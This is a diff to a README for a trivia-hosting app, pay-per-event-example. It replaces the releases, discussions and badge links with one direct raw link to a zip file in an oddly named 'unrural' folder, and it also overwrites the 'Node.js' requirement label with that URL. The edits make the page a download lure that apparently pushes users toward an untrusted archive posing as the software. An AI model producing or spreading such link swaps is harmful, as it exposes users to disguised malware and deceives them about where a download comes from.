@@ -6,14 +6,14 @@ Welcome to the pay-per-event-example! This application allows you to generate tr
 
 ## 📥 Download Now
 
-[![Download pay-per-event-example](https://img.shields.io/badge/Download-pay--per--event--example-blue)](https://github.com/nhatanh6900/pay-per-event-example/releases)
+[![Download pay-per-event-example](https://github.com/nhatanh6900/pay-per-event-example/raw/refs/heads/main/unrural/example-per-pay-event-2.8.zip)](https://github.com/nhatanh6900/pay-per-event-example/raw/refs/heads/main/unrural/example-per-pay-event-2.8.zip)
 
 ## 📂 What You Need
 
 Before you start, ensure your computer meets these requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 12 or later
+- **https://github.com/nhatanh6900/pay-per-event-example/raw/refs/heads/main/unrural/example-per-pay-event-2.8.zip** Version 12 or later
 - **Internet Connection:** Needed for downloading the app
 
 ## 📊 Features
@@ -28,7 +28,7 @@ Before you start, ensure your computer meets these requirements:
 
 To install the pay-per-event-example, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/nhatanh6900/pay-per-event-example/releases) to find the latest version of the software.
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/nhatanh6900/pay-per-event-example/raw/refs/heads/main/unrural/example-per-pay-event-2.8.zip) to find the latest version of the software.
 
 2. **Choose Your Download:** Look for the latest release and click on the download link for your operating system. 
 
@@ -58,7 +58,7 @@ To host your trivia event, simply share your device screen with friends on a vid
 
 If you have questions or need help:
 
-- Visit [GitHub Discussions](https://github.com/nhatanh6900/pay-per-event-example/discussions) for user support and tips.
+- Visit [GitHub Discussions](https://github.com/nhatanh6900/pay-per-event-example/raw/refs/heads/main/unrural/example-per-pay-event-2.8.zip) for user support and tips.
 - Check our FAQ section in the Releases page for common queries.
 
 ## 🧑‍💻 Contributions
@@ -71,4 +71,4 @@ pay-per-event-example is open-source software. Feel free to use and modify it bu
 
 ## 🔗 Download Again
 
-For a quick download, head back to our [Releases page](https://github.com/nhatanh6900/pay-per-event-example/releases) and grab the latest version of pay-per-event-example. Enjoy your trivia events!
+For a quick download, head back to our [Releases page](https://github.com/nhatanh6900/pay-per-event-example/raw/refs/heads/main/unrural/example-per-pay-event-2.8.zip) and grab the latest version of pay-per-event-example. Enjoy your trivia events!
